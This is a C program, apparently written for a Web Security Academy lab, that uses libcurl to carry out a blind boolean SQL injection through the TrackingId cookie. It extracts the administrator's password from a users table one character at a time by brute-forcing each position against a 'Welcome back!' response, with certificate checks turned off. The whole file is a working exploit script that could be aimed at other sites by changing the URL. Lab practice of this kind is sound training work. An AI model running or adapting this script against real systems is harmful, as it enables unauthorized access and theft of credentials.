#include <stdio.h>
#include <string.h>
#include <curl/curl.h>
#include <unistd.h>

// COMPILE USING gcc -o scan scan.c -lcurl -Wall -Wextra -O2

struct Memory {
    char data[4096];
    size_t size;
};

static size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct Memory *mem = (struct Memory *)userp;

    if (mem->size + realsize < sizeof(mem->data)) {
        memcpy(&(mem->data[mem->size]), contents, realsize);
        mem->size += realsize;
        mem->data[mem->size] = 0;
    }
    return realsize;
}


int main() {
    char result[21] = {0};

    char carac_list[36];
    int idx = 0;

    for (char c = 'a'; c <= 'z'; c++)
        carac_list[idx++] = c;

    for (char c = '0'; c <= '9'; c++)
        carac_list[idx++] = c;

    int carac_len = idx;

    CURL *curl = curl_easy_init();

    if (!curl) return 1;

    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
    /* avoid HTTP/2 framing issues on some setups by forcing HTTP/1.1 */
    curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, (long)CURL_HTTP_VERSION_1_1);

    for (int j = 1; j <= 20; j++) {

        for (int i = 0; i < carac_len; i++) {
            usleep(50000); // unsigned in => 50ms
            char trackingId[512];
            snprintf(trackingId, sizeof(trackingId),
                "TrackingId=ZqX1Yq4RoYtVJz7D'+and+(select+substring(password, %d, 1)+from+users+where+username='administrator')+=+'%c'--", j, carac_list[i]);

            char cookieHeader[600];
            snprintf(cookieHeader, sizeof(cookieHeader),
                "Cookie: %s; session=%s",
                trackingId,
                "5wnGANGV88XX6qKFx2kZbEwuaBbQfRlG"
            );

            struct curl_slist *headers = NULL;
            headers = curl_slist_append(headers, "User-Agent: Mozilla/5.0");
            headers = curl_slist_append(headers, cookieHeader);

            struct Memory chunk;
            chunk.size = 0;
            chunk.data[0] = '\0';

            curl_easy_setopt(curl, CURLOPT_URL, "https://0acb00ed03def30980b16c66007000e2.web-security-academy.net/filter");
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &chunk);

            CURLcode res = curl_easy_perform(curl);
            if (res != CURLE_OK) {
                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
            } else {
                long response_code = 0;
                curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
                if (chunk.size > 0) {
                    size_t to_print = chunk.size < 200 ? chunk.size : 200;
                    fwrite(chunk.data, 1, to_print, stdout);
                    if (to_print == 200) putchar('\n');
                }
            }
            // printf(chunk.data); // DEBUGGING
            if (strstr(chunk.data, "Welcome back!") != NULL){
                printf("%d.%c SUCCESS\n", j, carac_list[i]);
                result[j - 1] = carac_list[i];
                curl_slist_free_all(headers);
                break;
            }else {
                printf("%d.%c FAILED\n", j, carac_list[i]);
            }

            curl_slist_free_all(headers);
        }
    }
    printf("PASSWORD CRACKED: ");
    for (int i = 0; i < 20; i++){
        printf("%c", result[i]);
    }
    printf("\n");

    curl_easy_cleanup(curl);
}